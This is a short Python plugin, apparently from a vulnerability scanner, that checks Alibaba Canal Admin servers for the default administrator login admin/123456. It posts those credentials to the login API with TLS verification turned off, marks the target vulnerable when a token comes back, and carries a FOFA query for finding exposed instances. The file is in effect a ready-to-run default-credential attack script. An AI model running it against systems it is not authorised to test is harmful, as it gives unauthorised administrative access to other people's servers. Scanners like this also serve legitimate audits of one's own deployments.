#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Alibaba Canal默认账号密码',

      'level'     :   'critical',

      'FOFA'      :   'title="Canal Admin"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/json',
      }
  target = '/api/v1/user/login'
  data = '{"username":"admin","password":"123456"}'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'code.*?20000.*?message.*?data.*?token.*?',res.text,re.S):
      ret['huixian'] = '账号/密码：admin/123456'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret